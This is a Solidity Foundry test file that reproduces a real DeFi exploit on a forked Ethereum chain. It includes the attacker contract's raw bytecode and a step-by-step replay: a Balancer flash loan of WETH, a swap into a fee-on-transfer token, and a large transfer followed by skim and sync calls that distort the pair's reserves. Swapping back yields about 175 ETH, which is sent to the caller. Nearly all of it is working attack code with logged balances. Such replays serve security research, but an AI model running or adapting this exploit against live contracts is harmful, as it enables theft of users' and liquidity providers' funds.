// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0x3b19e152943f31fe0830b67315ddc89be9a066dc89174256e17bc8c2d35b5af8
// https://etherscan.io/address/0x6057A831D43c395198A10cf2d7d6D6A063B1fCe4

interface I {
    function transfer(address, uint256) external payable;
    function sync() external payable;
    function approve(address, uint256) external payable;
    function flashLoan(address, address[] memory, uint256[] memory, bytes memory) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] memory,
        address,
        uint256
    ) external payable;
    function balanceOf(address) external payable returns (uint256);
    function skim(address) external payable;
    function withdraw(uint256) external payable;
}

contract Xda2c is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x3b19e152943f31fe0830b67315ddc89be9a066dc89174256e17bc8c2d35b5af8");
    }

    address constant x0001 = 0x0000000000000000000000000000000000000001;
    address constant x4306 = 0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x7a25 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant xa415 = 0xa41529982BcCCDfA1105C6f08024DF787CA758C4;
    address constant xba12 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function test1() public {
        vm.createSelectFork("http://localhost:18545", 17826202); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x6472be941d7662cdf6a56f0ac8db0fb7816278a12f14fafa529f0216c402c3d7));

        // https://explorer.phalcon.xyz/tx/eth/0x6472be941d7662cdf6a56f0ac8db0fb7816278a12f14fafa529f0216c402c3d7
        this.x6472be94();
        // https://explorer.phalcon.xyz/tx/eth/0x3b19e152943f31fe0830b67315ddc89be9a066dc89174256e17bc8c2d35b5af8
        x31eb34a4();
    }

    function test2() public {
        vm.createSelectFork("http://localhost:18545", 17826182); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x6472be941d7662cdf6a56f0ac8db0fb7816278a12f14fafa529f0216c402c3d7
        this.x6472be94();
        vm.warp(1690965899);
        vm.roll(17826202);
        // https://explorer.phalcon.xyz/tx/eth/0x3b19e152943f31fe0830b67315ddc89be9a066dc89174256e17bc8c2d35b5af8
        x31eb34a4();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 17826202); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1690965899);
        vm.roll(17826203);
        // https://explorer.phalcon.xyz/tx/eth/0x3b19e152943f31fe0830b67315ddc89be9a066dc89174256e17bc8c2d35b5af8
        vm.deal(RECEIVER, 10 ether);
        vm.store(
            address(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54),
            keccak256(abi.encode(RECEIVER, uint256(3))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
            keccak256(abi.encode(RECEIVER, uint256(3))),
            bytes32(uint256(1000000000000000000000000))
        );
        x31eb34a4();
    }

    function x31eb34a4() public {
        address[] memory arr01 = new address[](1);
        arr01[0] = xc02a;
        uint256[] memory arr02 = new uint256[](1);
        arr02[0] = 20000000000000000000000;
        I(xba12).flashLoan(r, arr01, arr02, "");

        // uint256 v1 = 174786100489116297833;
        uint256 v1 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "174786100489116297833 (174.7861 ether)");
        I(xc02a).withdraw(v1);
        address(tx.origin).call{value: 174786100489116297833}("");
    }

    function x6472be94() public {
        _constructor_();
    }

    function _constructor_() public {
        bytes memory rt =
            hex"6080604052600436106100595760003560e01c806331eb34a41461006557806341c0e1b51461008757806351cff8d91461009c5780637cb97b2b146100bc578063f04f2707146100dc578063f940e385146100fc57600080fd5b3661006057005b600080fd5b34801561007157600080fd5b50610085610080366004610cff565b61011c565b005b34801561009357600080fd5b506100856103ca565b3480156100a857600080fd5b506100856100b7366004610d42565b610423565b3480156100c857600080fd5b506100856100d7366004610d42565b6105a3565b3480156100e857600080fd5b506100856100f7366004610eaa565b610610565b34801561010857600080fd5b50610085610117366004610fb3565b6106c8565b6000546001600160a01b031633148061015457506001546001600160a01b03161580159061015457506001546001600160a01b031633145b61015d57600080fd5b4161016757600080fd5b600480546001600160a01b038581166001600160a01b03199283161790925560058054858416908316179055600380549284169290911691909117905560408051600180825281830190925260009160208083019080368337505060055482519293506001600160a01b0316918391506000906101e6576101e6610fe6565b6001600160a01b03929092166020928302919091019091015260408051600180825281830190925260009181602001602082028036833701905050905069043c33c19375648000008160008151811061024157610241610fe6565b602090810291909101810191909152604080519182018152600082526007549051632e1c224f60e11b81526001600160a01b0390911690635c38449e90610292903090879087908790600401611040565b600060405180830381600087803b1580156102ac57600080fd5b505af11580156102c0573d6000803e3d6000fd5b50506005546040516370a0823160e01b81523060048201526001600160a01b039091169250632e1a7d4d915082906370a0823190602401602060405180830381865afa158015610314573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061033891906110e5565b6040518263ffffffff1660e01b815260040161035691815260200190565b600060405180830381600087803b15801561037057600080fd5b505af1158015610384573d6000803e3d6000fd5b5050600080546040516001600160a01b0390911693504780156108fc02935091818181858888f193505050501580156103c1573d6000803e3d6000fd5b50505050505050565b6000546001600160a01b031633148061040257506001546001600160a01b03161580159061040257506001546001600160a01b031633145b61040b57600080fd5b4161041557600080fd5b6000546001600160a01b0316ff5b6000546001600160a01b031633148061045b57506001546001600160a01b03161580159061045b57506001546001600160a01b031633145b61046457600080fd5b4161046e57600080fd5b6001600160a01b0381166104ba57600080546040516001600160a01b03909116914780156108fc02929091818181858888f193505050501580156104b6573d6000803e3d6000fd5b5050565b6000546040516370a0823160e01b81523060048201526001600160a01b038381169263a9059cbb9291169083906370a0823190602401602060405180830381865afa15801561050d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061053191906110e5565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af115801561057c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104b691906110fe565b50565b6000546001600160a01b03163314806105db57506001546001600160a01b0316158015906105db57506001546001600160a01b031633145b6105e457600080fd5b416105ee57600080fd5b600180546001600160a01b0319166001600160a01b0392909216919091179055565b61061861083c565b60055460075484516001600160a01b039283169263a9059cbb921690869060009061064557610645610fe6565b60200260200101516040518363ffffffff1660e01b815260040161067e9291906001600160a01b03929092168252602082015260400190565b6020604051808303816000875af115801561069d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106c191906110fe565b5050505050565b6000546001600160a01b031633148061070057506001546001600160a01b03161580159061070057506001546001600160a01b031633145b61070957600080fd5b4161071357600080fd5b6001600160a01b03821661075b576040516001600160a01b038216904780156108fc02916000818181858888f19350505050158015610756573d6000803e3d6000fd5b505050565b6040516370a0823160e01b81523060048201526001600160a01b0383169063a9059cbb90839083906370a0823190602401602060405180830381865afa1580156107a9573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107cd91906110e5565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610818573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061075691906110fe565b600360009054906101000a90046001600160a01b03166001600160a01b031663fff6cae96040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561088c57600080fd5b505af11580156108a0573d6000803e3d6000fd5b5050600554600480546040516370a0823160e01b8152309281019290925261093b9450737a250d5630b4cf539739df2c5dacb4c659f2488d93506001600160a01b0392831692169082906370a08231906024015b602060405180830381865afa158015610911573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061093591906110e5565b30610b71565b600480546003546040516370a0823160e01b81526001600160a01b03918216938101939093526000929116906370a0823190602401602060405180830381865afa15801561098d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109b191906110e5565b6004546003549192506001600160a01b039081169163a9059cbb91166109d8606485611136565b6109e390606461114f565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610a2e573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a5291906110fe565b5060035460065460405163bc25cf7760e01b81526001600160a01b03918216600482015291169063bc25cf7790602401600060405180830381600087803b158015610a9c57600080fd5b505af1158015610ab0573d6000803e3d6000fd5b50505050600360009054906101000a90046001600160a01b03166001600160a01b031663fff6cae96040518163ffffffff1660e01b8152600401600060405180830381600087803b158015610b0457600080fd5b505af1158015610b18573d6000803e3d6000fd5b5050600480546005546040516370a0823160e01b815230938101939093526105a09450737a250d5630b4cf539739df2c5dacb4c659f2488d93506001600160a01b039182169291169082906370a08231906024016108f4565b6106c1858585858560006002604051908082528060200260200182016040528015610ba6578160200160208202803683370190505b5090508481600081518110610bbd57610bbd610fe6565b60200260200101906001600160a01b031690816001600160a01b0316815250508381600181518110610bf157610bf1610fe6565b6001600160a01b03928316602091820292909201015260405163095ea7b360e01b81528782166004820152602481018590529086169063095ea7b3906044016020604051808303816000875af1158015610c4f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610c7391906110fe565b50604051635c11d79560e01b81526001600160a01b03871690635c11d79590610ca9908690600090869088904290600401611166565b600060405180830381600087803b158015610cc357600080fd5b505af1158015610cd7573d6000803e3d6000fd5b50505050505050505050565b80356001600160a01b0381168114610cfa57600080fd5b919050565b600080600060608486031215610d1457600080fd5b610d1d84610ce3565b9250610d2b60208501610ce3565b9150610d3960408501610ce3565b90509250925092565b600060208284031215610d5457600080fd5b610d5d82610ce3565b9392505050565b634e487b7160e01b600052604160045260246000fd5b604051601f8201601f1916810167ffffffffffffffff81118282101715610da357610da3610d64565b604052919050565b600067ffffffffffffffff821115610dc557610dc5610d64565b5060051b60200190565b600082601f830112610de057600080fd5b81356020610df5610df083610dab565b610d7a565b82815260059290921b84018101918181019086841115610e1457600080fd5b8286015b84811015610e2f5780358352918301918301610e18565b509695505050505050565b600082601f830112610e4b57600080fd5b813567ffffffffffffffff811115610e6557610e65610d64565b610e78601f8201601f1916602001610d7a565b818152846020838601011115610e8d57600080fd5b816020850160208301376000918101602001919091529392505050565b60008060008060808587031215610ec057600080fd5b843567ffffffffffffffff80821115610ed857600080fd5b818701915087601f830112610eec57600080fd5b81356020610efc610df083610dab565b82815260059290921b8401810191818101908b841115610f1b57600080fd5b948201945b83861015610f4057610f3186610ce3565b82529482019490820190610f20565b98505088013592505080821115610f5657600080fd5b610f6288838901610dcf565b94506040870135915080821115610f7857600080fd5b610f8488838901610dcf565b93506060870135915080821115610f9a57600080fd5b50610fa787828801610e3a565b91505092959194509250565b60008060408385031215610fc657600080fd5b610fcf83610ce3565b9150610fdd60208401610ce3565b90509250929050565b634e487b7160e01b600052603260045260246000fd5b600081518084526020808501945080840160005b838110156110355781516001600160a01b031687529582019590820190600101611010565b509495945050505050565b6001600160a01b03851681526080602080830182905260009161106590840187610ffc565b838103604085015285518082528287019183019060005b818110156110985783518352928401929184019160010161107c565b505084810360608601528551915081815260005b828110156110c75786810184015182820185015283016110ac565b506000818301840152601f909101601f191601019695505050505050565b6000602082840312156110f757600080fd5b5051919050565b60006020828403121561111057600080fd5b81518015158114610d5d57600080fd5b634e487b7160e01b600052601160045260246000fd5b8181038181111561114957611149611120565b92915050565b808202811582820484141761114957611149611120565b85815284602082015260a06040820152600061118560a0830186610ffc565b6001600160a01b039490941660608301525060800152939250505056fea264697066735822122067b32315264e07325d1bc49a90cf119a5994dbe257284c3af329e7453e09370064736f6c63430008110033";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) public {
        I(xa415).sync();
        // uint256 v1 = 20000000000000000000000;
        uint256 v1 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "20000000000000000000000 (20000.0 ether)");
        I(xc02a).approve(x7a25, v1);

        address[] memory arr06 = new address[](2);
        arr06[0] = xc02a;
        arr06[1] = x4306;
        I(x7a25).swapExactTokensForTokensSupportingFeeOnTransferTokens(v1, 0, arr06, r, block.timestamp + 1);

        // uint256 v2 = 44298177385759127606945;
        uint256 v2 = I(x4306).balanceOf(xa415);
        console2.log("I(x4306).balanceOf(xa415)\t->", "44298177385759127606945 (44298.1773 ether)");
        I(x4306).transfer(xa415, 4429817738575912760684500);
        I(xa415).skim(x0001);
        I(xa415).sync();
        // uint256 v3 = 623820134231023016967680;
        uint256 v3 = I(x4306).balanceOf(r);
        console2.log("I(x4306).balanceOf(r)\t\t->", "623820134231023016967680 (623820.1342 ether)");
        I(x4306).approve(x7a25, v3);

        address[] memory arr07 = new address[](2);
        arr07[0] = x4306;
        arr07[1] = xc02a;
        I(x7a25).swapExactTokensForTokensSupportingFeeOnTransferTokens(v3, 0, arr07, r, block.timestamp + 1);

        I(xc02a).transfer(xba12, v1);
    }

    function call() public payable {}

    fallback() external payable {
        revert("no such function");
    }
}
